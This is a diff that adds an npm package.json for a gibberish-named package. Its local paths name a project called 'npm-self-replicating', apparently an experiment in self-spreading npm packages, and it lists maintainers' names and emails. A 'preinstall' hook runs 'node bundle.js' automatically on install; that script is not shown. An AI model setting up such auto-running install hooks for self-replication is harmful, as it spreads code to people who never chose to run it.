@@ -1,0 +1,89 @@
+{
+  "_args": [
+    [
+      {
+        "raw": "sdfjghlkfjdshlkjdhsfg",
+        "scope": null,
+        "escapedName": "sdfjghlkfjdshlkjdhsfg",
+        "name": "sdfjghlkfjdshlkjdhsfg",
+        "rawSpec": "",
+        "spec": "latest",
+        "type": "tag"
+      },
+      "/Users/thomascrevoisier/Documents/Contributions/npm-self-replicating"
+    ],
+    [
+      {
+        "raw": "sdfjghlkfjdshlkjdhsfg",
+        "scope": null,
+        "escapedName": "sdfjghlkfjdshlkjdhsfg",
+        "name": "sdfjghlkfjdshlkjdhsfg",
+        "rawSpec": "",
+        "spec": "latest",
+        "type": "tag"
+      },
+      "/Users/thomascrevoisier/Documents/Contributions/npm-self-replicating/release"
+    ]
+  ],
+  "_from": "sdfjghlkfjdshlkjdhsfg",
+  "_id": "sdfjghlkfjdshlkjdhsfg@1.0.1",
+  "_inCache": true,
+  "_location": "/sdfjghlkfjdshlkjdhsfg",
+  "_nodeVersion": "7.8.0",
+  "_npmOperationalInternal": {
+    "host": "packages-18-east.internal.npmjs.com",
+    "tmp": "tmp/sdfjghlkfjdshlkjdhsfg-1.0.1.tgz_1493026125857_0.05456836358644068"
+  },
+  "_npmUser": {
+    "name": "thomasc__",
+    "email": "crevoisier.thomas@gmail.com"
+  },
+  "_npmVersion": "4.2.0",
+  "_phantomChildren": {},
+  "_requested": {
+    "raw": "sdfjghlkfjdshlkjdhsfg",
+    "scope": null,
+    "escapedName": "sdfjghlkfjdshlkjdhsfg",
+    "name": "sdfjghlkfjdshlkjdhsfg",
+    "rawSpec": "",
+    "spec": "latest",
+    "type": "tag"
+  },
+  "_requiredBy": [
+    "#USER"
+  ],
+  "_resolved": "https://registry.npmjs.org/sdfjghlkfjdshlkjdhsfg/-/sdfjghlkfjdshlkjdhsfg-1.0.1.tgz",
+  "_shasum": "4a43af0131522b6a9a74c528b02e5e7bc195cefc",
+  "_shrinkwrap": null,
+  "_spec": "sdfjghlkfjdshlkjdhsfg",
+  "_where": "/Users/thomascrevoisier/Documents/Contributions/npm-self-replicating/release",
+  "author": "",
+  "dependencies": {},
+  "devDependencies": {},
+  "directories": {},
+  "dist": {
+    "shasum": "4a43af0131522b6a9a74c528b02e5e7bc195cefc",
+    "tarball": "https://registry.npmjs.org/sdfjghlkfjdshlkjdhsfg/-/sdfjghlkfjdshlkjdhsfg-1.0.1.tgz"
+  },
+  "keywords": [],
+  "license": "ISC",
+  "main": "index.js",
+  "maintainers": [
+    {
+      "name": "mr_robot",
+      "email": "mr_robot@caramail.com"
+    },
+    {
+      "name": "thomasc__",
+      "email": "crevoisier.thomas@gmail.com"
+    }
+  ],
+  "name": "sdfjghlkfjdshlkjdhsfg",
+  "optionalDependencies": {},
+  "readme": "ERROR: No README data found!",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node bundle.js"
+  },
+  "version": "1.0.2"
+}
